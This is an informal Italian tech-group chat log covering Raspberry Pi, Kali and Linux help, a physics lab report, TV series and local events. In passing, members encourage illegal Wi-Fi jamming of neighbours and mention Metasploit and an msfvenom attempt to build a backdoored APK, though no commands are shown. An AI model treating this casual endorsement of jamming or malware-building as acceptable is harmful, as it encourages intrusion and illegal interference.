Uscita 9 mi sembra chiusa
Vediamo se troviamo una strada 
Ora è in piazza dante per la sfilata
Da quello che dice il tg in diretta
Eh allora l'unica è l'autobus
Il 16
È praticamente impossibile andare in centro con l'auto
Anche se ci si riuscisse non si troverebbe posto
Meglio autobus
Come cambio l'ora su kali?
Eh in centro si.. Ma Gardolo..
Anche quello
Non saprei in che condizioni sono le strade
sei di Vicenza? 
qualcuno ti sta prendendo l'handshake 
Yessa
Ovvio, l'hanno tutto chiuso il centro
Rossa, arancione e blu sono off-limits oggi
aggiorna i driver
lo faceva anche il telefono di mia madre
?
Sei riuscito a metterlo sul raspberry?
Si
come cambio l'ora
Fai volare il drone
Grande!!!, per cambiare l'ora devi andare sulle impostazioni
Dove?
Tasto destro
Co dovrebbero essere delle impostazioni del Desktop
Xfce
Dove
Su mattarella
Il racer
Tutto ovviamente col consenso dell'enac

Scusatemi... per il progetto che ha vinto...
Non posso ricevere qui il file... e possibile inviarmelo a 
Ti ho inviato una foto da li dovresti riuscire a cambiare l'ora
Dove
Dove devo premere
Vai da terminale, ti ho inviato un link
Perché dopo l'aggiornamento mi mostra questa partizione...? Come faccio a nasconderla?... è insopportabile ogni 2 minuti viene una notifica che dice che il disco E è pieno....
Io non lo ho ancora fatto l'aggiornamento
Devo riuscire a skipparlo
Mi da invalid date
Aspe hai provato a scrivere 
Sudo raspi-config
É kali
Non saprei allora, hai visto su 
?
No
Ma come devo fare il date?
13/05/2018 12:08:00 ?
Ci sono così tanti di voi che contro il regolamento mi scrivono in pvt che stavo per bloccare e segnalare SaddyTech 
LOL
Mi ha preso solo la data
Non l'ora
OK allora non so
Mi spiace

Vogliamo 
 con la piuma nera in testa nel prossimo video 
Ma se è sceso in città giusto un po' venerdì
Trentatrè alpini entrarono a Trento tutti e trentatrè trotterellando e bevendo ... Trentadue alpini uscirono da Trento tutti e trentadue barcollando
Ahaha io sono appena tornato a casa
Forse torno nel pomeriggio/sera, boh
Io sono fortunato se torno a casa per le 23 
Se vi chiedete dove sia l'alpino rimanente è da qualche parte a Trento in coma etilico
Grappa trentina 
Fanno ancora la grappa con la vipera ?
Sisi
Ieri a piazza duomo c'era un tipo collassato sui gradini della fontana. Si avvicinano quelli della croce rossa, lo scuotono, lo schiaffeggiano, gli misurano il polso e poi lo lasciano lì. Non so se era perché era tutto a posto o perché non era abbastanza grave 
Mi spiegarono che la vipera si mette dentro ancora viva e sviene con i fumi dell’alcool
Ah non saprei.. Non sono un grande appassionato di grappe
Io nn amo bere, però assaggiare mi piace molto
meh ho avuto solo brutte esperienze con le grappe
Una che era in una bottiglia dal tappo ammuffito e mi ha fatto proprio passare la voglia
Io durante una ciaspolada ( i trentini mi scuseranno se l’ho scritto male) me ne andai proprio di brutto tra vin brûlé e grappa, al motto di “riscaldiamoci” e “beh un bicchierino per provare”
o perché orami era tardi
Nah era mezzanotte tipo
In generale se nn sono bradicardici o nn stanno rimettendo l’anima, gli ubriachi nn si lasciano stare, fanno più casino che il resto, sia in ambulanza che in ps

Ma sì boh stanno intervenendo su un migliaio di persone a  notte
Ci sta che quelli che non sono in pericolo li lasciano
Chi ama la tempesta? Da me c'è una proprio bella
Poverini 

Non ci vuole tanto ad installare arch
Anche se Gentoo è molto più ottimizzato
Il wifi/bluetooth jamming è illegale, giusto?
si
Anche se blocco contemporaneamente Spotify ai 14enni che sono davanti a casa mai che stanno disturbando tutto il vicinato con la cassa?
è illegale, per farlo devi avere il loro consenso
però se lo fai non si accorge nessuno, siamo in Italia
?
Non sai cos'è, giusto?
Bhe insomma, un po' di tempo lo perdi
Ma 15 minuti mi sembra troppo poco
Morrolinux ha fatto un video lungo 10 minuti in cui parlava anche
Ovvio che se stai lì a perdere tempo con i font del cazzo ci metti di più
Si ma lui lascia systemd
Penso che se stanno ascoltando trap (e qualcosa mi dice che lo stanno facendo) è legale bloccare Spotify.
Despacito
Se non vuoi systemd metti Gentoo
Ah, allora penso che anche qualche bomba a mano vada bene
EMP?
Anzi no
Con arch + openrc mi trovo bene
Sarebbe sprecata
satto
2 Franceschi
Cioè, ok che ognuno si può ascoltare la musica che vuole, ma cazzo, fallo senza disturbare la gente. Specie se è musica di merda
Specie se stai usando una JBL Extreme
CHE NON TI MERITI SE ASCOLTI SOLO CANZONI SPAGNOLE E GHALI
guarda il lato positivo, ancora non sono arrivati a sfera  o tizi simili
Ho sentito ora Young Signorino
Se hai un po' di auricolari rotti lanciaglieli per fargli capire che non devono svangare
Anzi, non si merirerebbero nemmeno quelli
hanno messo?
Non invio l'audio perché mi bannate
se sì allora puoi ricorrere direttamente a un rpg
io chiamerei i caramba direttamente 
satto
Soldi sprecati
Beh sarebbe tutto totalmente legale
CE L'HO FATTA
Oltretutto in questa fascia oraria non si dovrebbe far casino
Attacco con coltello a Parigi , un morto e 4 feriti. L’Isis rivendica. L’aggressore ha urlato “Allah Akbar”. Si indaga per terrorismo.


fai la stessa cosa
Bloccasti?
Ho tirato un bestemmione dalla finestra

ti stimo
Metodo classico ma che funziona sempre
Se mandavi qua il video te lo abbuonavo per qualche minuto senza warnarti
quale?
del porcone?
Yess

Prossima volta giuro che tiro fuori il Jammer
No
Esempio stupido:
Hai mai giocato a Rainbow Six Siege?
No
Jammare un segnale wireless qualsiasi vuol dire bloccare contemporaneamente alcuni domini come friggere la scheda di rete
Nel caso del wifi jamming puoi bloccare tramite alcuni programmi o alcuni dispositivi l'accesso ad alcuni siti o la possibilità di un dispositivo di connettersi
Quindi in pratica blocchi la connessione
Tutto ciò è illegale ovviamente
I programmi o i dispositivi (che costano pochi dollari tra l'altro) non li trovi di certo su Gearbest
beh, un nodeMCU può diventare un jammer e lo trovi anche su Amazon
Anche un Raspberry PI o qualsiasi dispositivo con wifi e bluetooth
Parlo di quelli con un raggio molto più ampio
La  polizia di stato è dotata con Jammer da 2km di raggio
La DIA li usa dagli anni ottanta per bloccare le telefonate
La cencellazione del rumore é una nuova feature

 ‎€2‎95‎.6‎2 ‎in‎ve‎ce‎ c‎he‎ €‎38‎0.‎00
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎2.‎21%
⭐️‎ 4‎.3‎0 ‌‎/‌‎ ‎5.‎00‎ (‎18‎ r‎ec‎en‎si‎on‎i)
 

ciao
Peccato che le swing in java non siano più di moda...
Ormai swing è morto
Ma sono tolte e non utilizzabili?
Come funziona la cosa???
Ora si programma con altro... mi hanno anche detto come. .. ma non mi ricordo...
Ma manuali in italiano niente
C’é ancora swing ma per fortuna nessuno lo usa più
Io sapevo programmarle... ho tutti i programmi risalenti al 2004
 guarda che robe che si fanno con JavaFX
Cos
Siamo arrivati ad Oxygen
Solo 10 euro? Non è troppo poco?

 ‎€1‎0.‎17‎ i‎nv‎ec‎e ‎ch‎e ‎€1‎2.‎71
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 1‎9.‎98%
⭐️‎ 5‎.0‎0 ‌‎/‌‎ ‎5.‎00
 Store: Banggood
 

No scusa 2.1
È più vecchia di me
2004 circa
Forse anche prima... comunque funziona bene con windows10
E stato sempre un buon ide
Hai mai provato IntelliJ Idea? Ormai Eclipse è vecchio
All'epoca usavo anche la JCreator
Hai visto processing
No intelliJ
Si usa quello ormai
Non la conosco ...
Tutto il resto del prezzo lo fa la mela stampata sull'astuccio
Ma fanno cagare
AirPods masterrace
Qua se dici trentatre triggeri tutti
Le hai comprate?
Nope ma mi pare ci fosse la recensione di Galeazzi
Ah, se la trovi me la mandi?
Non so se sono proprio queste qui
: 
Ah ma sono a 30 euro
Sì beh ancora meglio in teoria
Esatto 
Vabbe le ordino, sono curioso di vedere come sono
Al massimo si sentono male..
Ah 
Ma sì ovvio... Io ho le cuffie Bluetooth Mpow da 16€... Non sono come le Sony da 300€ ma mi vanno benissimo lo stesso e le uso per editare tutti i video
Ah
Beh sì ok le compro
Ma si vede che sono tarocche?
Ovvio che Galeazzi dopo aver provato centinaia di prodotti per migliaia di euro è più sofistico 
O le scambiano per originali?
Sì beh solo che per quella cifra prendi roba più buona
Mmmh non ne ho idea... Probabilmente se le guardi da vicino e sai come sono fatte quelle originali sì
Le vere AirPods
Tipo questo povero orologiaio, che doveva dimostrare a tutti i costi di riuscire a distinguere un finto Rolex da 300€ da uno vero da 40.000€  E alla fine con la lente di ingrandimento vede 
 
 
 



Mi passate qualche vostro programma innata?
Java?
Ragazzi ho un problema:
Ho comprato 2 settimane fa la Sony a6300 e un kit di 2 batterie + caricatore doppio. Sia la a6300 che il caricatore delle batterie hanno ingresso microusb pertanto possono essere caricate con un normale adattatore o con un 
. È proprio in quest'ultimo il problema ovvero:
Se le attacco a un nuovo Powerbank della Decathlon da 5000mah non succede nulla mentre se attacco a un vecchio Sony da 2000mah si carica e funziona. Come mai quindi il Powerbank più grosso non carica?
Per 10 euro??
Nono per trenta
Quelle di Galeazzi dico
Ah Vabbe son sempre 20 euro in più
Wooo intanto complimenti per la a6300
Grazie, finalmente mi sono preso una cosa un po' seria
Secondo me serve qualcuno che riesca ad erogare 2.4A
No perché con il vecchio Sony da 1A 2000 Mah funziona. L'altro comunque ne eroga 2.1 che sono più che sufficienti per caricare la macchina
Ma ho proprio notato che alcuni Powerbank caricano solo i telefoni, ad esempio un altro che avevo non funzionava con una di quelle lampade USB (il Sony invece andava anche con quella)
Ah dipende dall'handshake dell'usb allora
Sarebbe? Scusa non ne so tanto.
Comunque ho appena provato a collegarlo quando la macchina è accesa: la fotocamera va in modalità mass storage come quando la collego al pc...
È una sola cuffietta 
No sono 2
Puoi anche sceglierne una
Ah perché c'è scritto "Single ear earphone"
Ci sono le opzioni
 sono una o due?
Ci sono le opzioni
Destra, sinistra o entrambe
In ogni caso hai l'astuccio powerbank comunque
Ah allora ok ok. Sarei curioso di sapere esattamente come si sente... Bassi, medi ed alti...
Qualcuno mi passa una guida 
 per installare metasploit su raspbian?
Costano sempre 11 euro circa?
Beh se ne prendi due costano come due 
Come calcolo la forza peso?
La forza peso è m*g
La massa non c'è l'ho
Se non sai la massa ma la densità è il volume puoi fare
V*d*g

Nemmeno la densita
Abbiamo preso un corpo metallico, messo sul dinamometro e messo in acqua
Sbagliato io a leggere
FP sta per forza premente e non per forza peso
beh ma è sempre la stessa storia, è la componente perpendicolare della peso, ma senza la peso come fai?
se poi è orizzontale il piano allora coincide anche con la peso
Il peso è fp1
Ho misurato con il dinamometro prima e dopo messo in acqua
a ecc
Ma cosa?
E' una frecciatina a tutte le compagnie telefoniche italiane
La mia amica Ada è la responsabile ufficio legale di Iliad Italia
... E scusa se è poco!
Eh porco boia, mica cazzi
Su Internet si specula del fatto che quei numeri 5 e 15 possano significare qualcosa... Tipo che il 15/5 succederà qualcosa...
Ah quindi 20 euro
Ma è l'esperienza sul principio di Archimede?
Secondo me è sbagliata la tabella
Manca la colonna 'Sa' che rappresenta la spinta di Archimede
Si
Fa sta per forza di Archimede
Il liquido spostato va passato da ml a dm^3
In effetti devo cambiarla
1 dm^3 POI è' uguale a 10^-3 m^3
Ti mando la mia esperienza fatta  però con un solo corpo
vabbene, grazie mille
questa è la mia fino ad ora
Puoi prendere spunto devi solo cambiare i dati e mettere altre colonne... in pratica andrai a confrontate la spinta ottenuta dall'esercitaziobe con quella che ti calcoli con la formula densità del liquido* volume spostato *accelerazione di gravita'
Devi mandare a 
Non posso aprire da telefono
principio di Archimede prova
Leggitela devi fate delle conversioni tra ml e m^3
Domanda breve. Ieri ho aperto un video con vlc e mi sono accorto che mettendono in full screen rimaneva visibile la barra di windows con le app aperte. Fin li pensavo che fosse un problema di vlc, ho aperto lo stesso video con il lettore di windows ed è andato in full screen correttamente. Ora provo a mettere in full screen un video di youtube e ho lo stesso problema. Ho notato inoltre che la stessa cosa accade anche se metto tutto chrome in full screen? Sapete come risolvere sta cosa? Ho come l'impressione che si sia "aggiunta" con l'ultimo aggiornamento di windows
Per poter svolgere i calcoli più agevolmente
Oscar etto di dove?
che?
Da dove?
lazio
anch'io ho sto problema tipo da 6 mesi
Ho riavviato Explorer.exe ed è partito
Davide comunque ho risolto come pensavo studiando la guida ho trovato un comando che modifica l'impulso del relay interno, quindi se volete collegare un sonoff touch ad un relay (nel mio caso ciclico) basta impostare il comando PulseTime spero di essere stato d'aiuto!
Per usarlo come pulsante invece di interruttore?
in un certo qual modo si perchè avevo bisogno che l'interruttore simulato dal sonoff doveva essere bistabile e non monostabile, per aprire e chiudere il relay. spiego in modo pratico: clicco il touch del sonoff, scatta il relay interno e in parallelo quello nel muro, successivamente in automatico il sonoff manda un impulso al relay interno e sempre in parallelo quello nel muro così la luce si spegne e accende spero di essere stato comprensibile
ecco, te lo stavo per chiedere. É un bug dell'ultimo update di windows
a me si bugga anche se ingrandisco a tutto schermo (non schermo intero, il normale "massimizza" delle finestre) e resta una riga di pixel bianca in cima
maaa perchè mio zio è una meme?

ahahahahahahah
Ci puoi creare uno sticker pack solo su quell'immagine
🤭 Ops
okay...devo fare un tv b gone, come alimento il rasp? con un powerbank cosa distruggo?
ahahahahahahah
cos?
Il rasp non fa più. Come risolvo?
Non mi da output sul monitor
Of course
Aiuto
Qualcuno
reinstalla l'os
No vabbe sono scemo
Non avevo cambiato l'ingresso
e non usare il tool di ripartizionamento di Windows che il 99% delle volte che formatti con lui il Raspberry non parte più con quella SD perché ti crea partizioni logiche invece che primarie

Lo comprereste voi?
Lo ho fatto già 7-8 volte
io avevo dato per rotto un RPi
Avete mai comprato su RS Components? È affidabile? C'è il Raspberry Pi 3 B+ a poco meno di 30 euro...
avevo due RPi 3 uno più rotto dell'altro, alla fine quello più nuovo è deceduto, quello più vecchio sono riuscito a farlo ripartire anche dopo averlo bruciato male e funziona tutto, GPIO compreso, l'unico problema è che scalda troppo, ma finché sta sotto gli 80 shalla
Applet IFTTT
affidabilissimo
Allora, per esercitarmi con metasploit cosa uso? Raspbian o kali? (Ne su uno ne sull'altro risulta installato e kali scalda un pò da quello che vedo)
Mi fa gola il prezzo
su RS-Components compro all'ingrosso quasi tutti i componenti che uso
poi ho conosciuto i ragazzi di RS al Maker Faire (ovviamente parlavano inglese) e mi hanno regalato un Cardboard
?
non lo usi 
Cosa non devo usare?
Il rasp?
Metasploit?
sinceramente non capisco tutta questa moda di fare i LoHacker, sai che è una cosa illegale sia a livello di legge ma anche a livello morale, a che ti serve imparare a usarlo? E' bello sapere come funzionano gli exploit e le backdoor, ma non utilizzarli.
Il monitor?
Era solo per provare ad usarlo
Per vedere quanto male posso farmi da solo inconsciamente con i comandi
si ho visto ora hai ragione 2 cuffiette costano 27 euro

Perfetto! Grazie mille per l'informazione!
Ragazzi io ho un Honor 6c pro ma non mi è ancora arrivato orea
si piu che affidabile
Allora, per esercitarmi con metasploit cosa uso? Raspbian o kali? (Ne su uno ne sull'altro risulta installato e kali scalda un pò da quello che vedo)
Raga ogni volta che vedo  un 12-year old programmer/hacker mi vergogno sono molto bravi per l'eta
Ciao scusate non insultatemi, mi vergogno già da solo per aver usato kali... Ho provato per divertimento a usare msfvenom seguendo il video di overvolt solo che mi esce l errore: unable to rebuild apk with apktool
Finito di sfilare adesso 
I trentini alle 20 circa sfilano
Io scendo dopo
Dopo cena intendo
Io guardo la diretta di rttr
Da casa
Io so stufo 
Anche io ho questo problema... Non ho ancora risolto
fa sempre cosi
io non ci riesco
Questa mi giunge nuova, credo sia una specie di Patreon di YT
È già da un po' che c'è, ma solo su pochi canali
Sì esatto è molto simile anche al sottoscrivi di twich
Da mesi, solo per i canali di gaming
raga io so programmare.
so specificare sempre il content-type giusto al browser
non gli sto dicendo che deve ricevere del testo utf-8 e poi gli mando un audio mp3, noooo
gooood
Good job good job
Quando può scaldare il rasp?
Poco
Dico quanto regge
Buonasera, qualcuno può darmi delle spiegazioni riguardi ad arduino e il modulo hc 06? Ho collegato un led e l'ho fatto accendere attraverso la lettura di un carattere contenuto in una variabile di tipo char. Ora voglio provare a inviare delle stringhe via Bluetooth e stamparle su uno schermo lcd...secondo voi è fattibile?
Dovrei collegare un impianto audio 5.1 Sia il Google Home sia il pc però un mixer costa troppo cosa mi consigliate
, tu che hai seguito per bene il Google I/O
Google ha stretto qualche collaborazione con i produttori di smartphone per offrire Android AOSP come alternativa sui dispositivi con personalizzazioni pesanti? Tipo il fatto che il MiMix2s ha Android P puro oltre alla MIUI
Non so di particolari collaborazioni
Non hanno parlato di particolari collaborazioni ma che sarà disponibile la beta anche per alcuni dispositivi (soprattutto 1 o 2 top di gamma) anche di alcune aziende. Oltre che per i pixel
Almeno nella presentazione generale Google I/O principale.
Poi non so se negli altri 2 giorni di conferenze magari ne hanno fatta una su questo argomento ma dai titoli che avevo letto non mi pare...
Si, ho visto i dispositivi... Però non so se abbiano detto qualcosa in piu
Invece questa settimana vi porto una chicca da Makers, nel video
cosa ne pensate del masterliquid lite 240?

Nope
Zero
La preview che danno è solo opera di treble
Noi vogliamo una chicca da vero anon.....il video su p4wnip ( o come diavolo si scrive) è ancora libero  (io l'ho già fatto, mi sono portato avanti)
PS: ho una proposta
ho il masterliquid ML240L RGB
Lol
con la mia cpu è più estetico ma vabbè
Che ha fatto? 
ti salutano il Caffè Matteotti e Sottozero
 sono vivo ragazzi, tranquilli
anche se il nuovo secondo lavoro mi sta uccidendo lentamente di fatica
ho detto "dio è porco" e "viva il duce" con la foto di mussolini
Ora posso guardarmi breaking bad in pace?
forse
Ovvio che no
Non credo proprio
Non ci credo, lo ha pure ripetuto 
Cazzo oh
Domani scuola
Un genio 
IronMan muore

Dovevi dirlo no?
Interrogazione di chimica e non so un emerito cazzo
Prima devi rispondere a me 🤷‍♂️
Mi state scassando la minkia
Ma è una rivisione, ovvio che se non avessi mai visto BB in vita mia mi sarei già buttato in canale
breaking bad va visto tutto almeno una volta nella vita
prima puntata?
Ma porca puttana, le parolacce sono ammesse?
Sisi comincio oggi 
Bella quella scena 
Beh si why not 🤔
Ahahahahahahah
Miticooo
*prima puttana?
Oh romboli hai visto la terza stagione di mr. Robot?
questo mica era un server di minecraft cristiano?

Ovvio
Ma in generale evitate di spoilerare le big robe, che c'è sempre qualcuno che non ha visto qualcosa ma ha intenzione di vederlo
Vale? Io devo finirla, prima devo finire la casa de papel
Ma la casa de papel non era un gruppo musicale tipo? 
Ma che ti senti?! 
Te lo giuro, hanno fatto il remix di bella ciao 
Io mi sono ripromesso che d'ora in poi guarderò in italiano solo suburra
 devi taggarti per farti leggere?!
Mica male
Me lo segno 
Ahahahahah sentito
Si, dopo aver sentito per 10 secondi il doppiaggio italiano di La Casa... 
Comunque ci metti meno di 6 minuti, e non devi montare niente (hai capito che intendo )
Ahahahahahah
Eh, hai visto che esiste
L'avevo già sentito
Ma è anche una serie tv?
Ovvio, una Delle piu famose al momento
Mah, mai sentita 
La serie tv non-USA più guardata di sempre su Netflix
la scena del deserto è mitica
Visto che ti trovi a parlare di serie...il 18 esce la seconda di 13
Il mio prof di matematica [stimo un botto (non solo perché sociologo) ] adora quella serie
Lo so
Che bravo
Waiting for it
Mi si vede che faccio lo scientifico
Invece BCS l'hanno ritardato
Mi emoziono 
Hanno iniziato a girare a gennaio, quando di solito usciva in primavera
BCS?
Better call saul
Spinoff di BB
Mai sentita
Sempre di Vince Gilligan
prof da stimare
io invece in this moment sto scaricando la 4a stagione di House of cards
Infatti lo stimo un botto!
così me le sparo tutte e 4 in una volta
Infatti la guardo solo perché ha una regia stratosferica e delle inquadrature che solo lui sa fare
Che aker XD!XDDXDX!
Eh vabbè, te pretendi troppo dalle serie 
Va bene, e perché ci sono Saul, Mike e Gus ☺️
Che giornata di merda
Meglio andare a dormire
Domani peggio ancora
Regaz problema
Ho una stampante wifi e voglio scannerizzare con il wifi simplescan non la rileva ma le stampe riesco a farle utilizzando il wifi
Idee?
🤔spiegati meglio..hai la stampante collegata al pc in wifi oppure stampi in wifi dal cellulare/fotocamera?
Citando un brano di willie peuote 

Sorry hai ragione anche tu, ho il pc con ubuntu e voglio usare il mio scanner integrato nella stampante wifi
Ho provato a installare scangearmp2 ma non trova nessuna stampante
Sappi che non sarai mai il solo ad avere una giornata di merda e a prevedere giornate di merda in futuro
hai solamente Ubuntu installato su quel pc oppure anche Windows? se hai anche Windows, funziona perfettamente?
Quindi dimentica e vai avanti fregandotene. Piu ci pensi e peggio stai
Dualboot e su Windows ho i software integrati e l'interfaccia grafica per l'installazione quindi sì
da telefono te la rileva?
Si e con Ubuntu viene rilevata la stampante, ma non lo scanner
Invece collegando con il cavo viene rilevato tutto
allora è un problema del driver wifi dello scanner, al 100%
se in wifi ti rileva solamente la parte della stampa e non quella dello scanner, sono i driver scritti con i piedi
Ho provato a cercarli ma ci sono gli MG2200 e poi i MG3100 ma io ho una MG2900
ovvio, perchè bypassa tutta la parte radio
Ma perché non hanno fatto un installer grafico
Bah
🤔 prova a vedere se quelli della 2200 sono della stessa serie..di solito li suddividono in anni di produziona, anche molti toner sono compatibili, anche se la stampante riporta un codice diverso
oppure prova ad aggiornare con quelli della 3100
Più che altro ho provato anche ad aggiungerli da "Driver aggiuntivi" ovviamente collegando la stampante al pc, ma non li trova
Dunque in teoria sono già presenti
🤔invece di fare cosi, fai una installazione pulita eliminando i driver vecchi..forse vanno in conflitto
Da Ubuntu o Windows?
Ubuntu
Allora ti chiedo l'ultima cosa
se windows ti funziona perfettamente non eliminare niente, cambia i driver su Ubuntu eliminandoli completamente e facendo una installazione pulita
Come faccio a installare il driver avendo il .tar.gz
Ubuntu vero?
Si, magari non ho mai installato nulla
🤔 devi farlo da terminale? non installa i driver in automatico tramite interfaccia grafica?
Ah sì, ti linko una guida per i vari file
Eh no, me li forniscono o in .deb o in formato RPM
A me è tornata più volte utile
allora non ho proprio idea..prova a chiedere a 
, è lui l'esperto
Aspetto la guida di 
 poi rompo le balle al 

Comunque grazie 
 ❤️❤️
Installare i pacchetti (.deb, .tar.gz, .tar.bz2, .sh, .run) su Linux Ubuntu

 mi ero dimenticato che dovevo mandartela 
Good job men
Good job
Di nulla
Quando vuoi
Ti posso aiutare nel possibile su Linux
Thx ❤️❤️
Sto cercando man mano di capire la differenza tra linux e unix
Ahahahahahah
Spostati, dopo cicca ci sono io 
 
 peccato non esserci incontrati...vi avrei volentieri offerto un giro. Sarà per la prossima!
Se proprio vuoi...offrilo a me

Saaaaad
Il che è stato difficile visto che sono stato un città tipo 10 ore al giorno
Seee le scuse
Avete visto che hanno aperto il canale Telegram ufficiale di Xiaomi in italiano?
(E il 26 maggio apre il Mi Store)
Dove? Milano?
Sì
ok
85 gradi e dopo va in downclock
Qualcuno ha fatto le invalsi
Si
Perché
In quella di ita cosa chiede
Domande sul tuo registro linguistico, un po'di lessico
Grammatica e sintassi
Ci sono 4 prove diverse se non sbaglio
Infatti
Anche comprensione di testi
Esatto
Me ne ero dimenticato
Sono 2 massimo 3 testi
Volevo sapere più o meno cosa c'è
Come qualsiasi invalsi fatta alle medie
Io le faccio oggi
Nulla di cui preoccuparsi tanto
C'era solo un esercizio che ho sparato completamente a caso in cui bisognava associare dei termini del linguaggio poetico a quelli del linguaggio attuale
Ok
Grazie al Google Home, adesso ho un sacco di tempo libero.

Risparmio dalle 2 alle 3 ore giornaliere perse a cercare il mio cell finito tra le coperte o in posti impensabili della casa

Con un colpo di "ehi Google, aiutami a trovare il mio telefono", si risolve tutto 
Altra curiosità su Google Home.

Guardando un video su youtube,  parte la pubblicità di Google Home e naturalmente dicono "ok Google" e il mio Google Home si attiva 

Direi che si apre un nuovo mondo di insicurezze IOT, evviva !!! 
Te ne sei accorto solo ora? C'era una pubblicità in tv che diceva "ok Google, cercami la mia azienda"
O qualcosa del genere
Ragazzi secondo voi si trova il leak della simulazione della seconda prova di matematica? E se si dove?
Che bellezza 

Con Google Home tutto diventa più dannoso

1. Sul cell. almeno devi sbloccarlo, mentre GH è sempre in ascolto

2. Sei più propenso a collegare tutta la domotica di casa al GH

Credo che il problema diventerà così grosso che Google dovrà mettere una gestione dei permessi, basata sugli utenti (riconosciuti dalla voce)

Altrimenti finisce "a Schifiu" 
C'è da dire che era una vera genialata
la gestione dei permessi probabilmente è già in sviluppo, volendo puoi escludere il microfono a google home ma facendolo diventa un fermacarte molto costoso
Io direi che ci sono gli estremi per considerarla una violazione non autorizzata dei sistemi informatici degli spettatori

BK hacker
Anche secondo me. Ma rimane comunque una genialata
Si concordi 
Perché?
lui stava solo parlando
Ha parlato al fine di attivare un dispositivo che non si sarebbe attivato altrimenti
A fini commerciali, e quindi di guadagno
Sni... In teoria i telefoni dovrebbero attivarsi solo con il tuo modello vocale
(se gli schermi sono spenti)
E in ogni caso quando attivi l'ok Google ti dicono di fare attenzione ecc... Secondo me non c'è nulla di male
beh, era un pubblicità, mi sembra normale
non possiamo mica censurare l'ok google per evitare problemi
Sapreste consigliarmi un sistema per hostare programmi (es. bot telegram) online h24 a basso (preferibilmente nullo) costo? Prendere una vps lowcost è l'ultima spiaggia su cui andrei
Secondo voi usare il servizio di aws lambda o aws ec2 puó andare bene?
Dipende in che linguaggio
Per python se hai basso traffico c'è heroku
Non funziona troppo male
Principalmente python, ma potrei voler far girare anche codice compilato
Secondo me ti conviene una VPS, fai quello che ti pare con il sistema, installi i db che vuoi
Su scaleway ci sono VPS che costano pochissimo, volendo puoi anche scegliere un server vicino a quelli di tg se ti serve solo il bot
Qualcuno di Milano?
Quindi i servizi di aws free scartati per principio?
Raspberry 
Cos'é il downclock?
Opposto di overclock
Si ma cosa fa il downclock
Passami il link di quel canale telegram
Te l'ho detto
Mi peggiora il rasp?
Me lo rompe?
Grazie
Sì
No
E posso riportarlo come nuovo?
Sì
Come?
Magia
._.
Avessi una connessione decente userei già quello, ma avendo una 7Mbps non simmetrici, altamente instabili, con una latenza enorme e spesso pure intasati non lo posso usare come server stabile (lo uso come server, ma un bot non lo metto lí di sicuro)
Perché no? Un bot di Telegram con utenza non troppo alta regge
Seriamente
Pensa che alla fine è come inviare e ricevere messaggi da Telegram, cambia che invece di farlo l'app sul tuo telefono lo fa il bot
Ho già provado ad hostarci un bot e anche con pochi utenti si passa da una risposta in qualche centinaio di ms a risposte che arrivano dopo un minuto (caso peggiore successo), e ho qualche bot attualmente che viene usato da un centinaio di utenti che vorrei riscrivere e piazzare su un servizio di hosting decente (attualmente sono scritti in php_merda e girano su altervista)
Scusa eh....ma che cazzo stai a fa?
Centinaia di utenti?!
Yep
È il bot di supporto di un gruppo
Ahhhh okay
Però potresti fare un bot per spacciare ora che ci penso 🤔
Comunque....
Se è solo per i bot e non devo installare Gesù Cristo ti posso prestare il server di Switchando Cloud
La mia scuola ha un bot che non usa quasi nessuno, nonostante ciò il bot ha una risposta velocissima
Sono uno dei pochi a conoscenza del progetto in realtà
Si potrebbe, ma è piu sicuro andare di persona e/o usare le chat segrete di telegram 
Chat segreta e vai sul sicuro 
Meglio criptare/decriptare i mex a mano
Ma va, è più veloce con telegram
Grazie mille, se non trovo alternative accetteró la tua offerta 
Comunque sono riuscito a rompere Ubuntu
Si, con crittografia ssl con chiavi da 4096bit
È facile rompere linux, basta un 

Io però senza usarlo 
Basta usare male il comando "sudo" e stai certo che fai danni
Tento di imbucarmi
16384 che non la buca neanche l’NSA xD
Non sei d'aiuto 
Non ti fanno entrareeee
Mica sei importante 🤷‍♂️
Fidati, già 4096 bit è difficile da bucare
 evoco te! Dici che dovrei seguire il consiglio della mia prof è cambiare sistema operativo? Stavo pensando ad arch 🤔
Tanto....a sto punto
La seconda casa di ogni risotto!
Non avevano detto che avrebbero assunto solo gente che sapesse il cinese?

Ahahahahah
Scaricatelaa voi, utenti consapevole
Ah no, marco ha OnePlus 
Ma no aggiorna e sistema i repo
Metti la 18.04
Come?!
Prof di merda
Mi ha detto che faccio prima a cambiare sistema operativo
Sni
Cioè
Salve, sono il presidente della provincia di Padova... Vuoi essere mio amico Marco?
"No"
Ma quel nome?!
Che?!
Sistema le repo e aggiorna a 18.04, easy
Tu intendi upgarde da terminale?
Cioè, per carità... Ma installare è quite long
Per avere una cosa rapida aggiorna
Okay, adesso....come?
Il mio aggiornare è fare update e upgrade
Ma nah, tieniti Ubuntu
Io sto in fissa con arch
E non fare come me che quando si rompe aptitude e non ho voglia di sistemare faccio il formattone
Lo stavo per fare ☺️
Adesso...che faccio?
Update e upgrade sono down
E dist-upgrade se vuoi aggiornare
Prima di quei due?
Elimina o sistema le repo non funzionanti
Cosí poi update e upgrade tornano a funzionare
dopo direi
Allora non posso
ma fixa sta cazzo di packages list o come si chiama
Okay, grazie
I want this shirt



by 
Hahahahahahha
Non esistono "sdoppiatori" di ingresso, il mixer è l'unica soluzione
O almeno credo
Povero CSS
Colpa di chi non lo sa usare
Esatto
in maniera ignorante salda in parallelo 2 cavi e attaccali all home teathre e al google home
Per un raspberry va bene un powerbank qualsiasi?
Uno che sputa fuori 2amp è meglio
Poi con una capacità grossa ti consiglio
Che dura di più
È possibile che mi si fonde?
Naah
È un raspberry non un reattore nucleare
Massimo si scalda
E si brucia
Buongiorno a tutti
Spero abbiate dormito bene!
Arch e Fedora tutta la vita
Abbiamo guardato Breaking Bad
Gentoo
Lool
Non è sicuro
Si
L'ho visto
Potrebbe anche sopravvivere per qualche settimana/mese
Ieri sera ho visto l'ultimo eposodio
L'ho finito in due settimane
Dal video non sappiamo se sia morto o meno, inoltre i federali dovevano arrestarlo ed a tutti i costi
Si abbiamo capito
Ah ok
Pure io l’ho visto, e da quello che abbiamo non possiamo sapere se sia morto sul colpo o se sia sopravvissuto per qualche settimana
Spero non sia uno spoiler
È uno spoiler grosso come una casa
Praticamente hai detto la fine di una delle serie tv più belle che abbiano mai prodotto, ma nulla di che
Cancelliamo?
vabbè è il fratellino di Arch, basta nominarne uno per includere anche l'altro :D
Lool
Hahahahja
 Manooo
raga
qualche maniaco del cable management?
Etcher funziona con i DVD?
OMG cicca approved
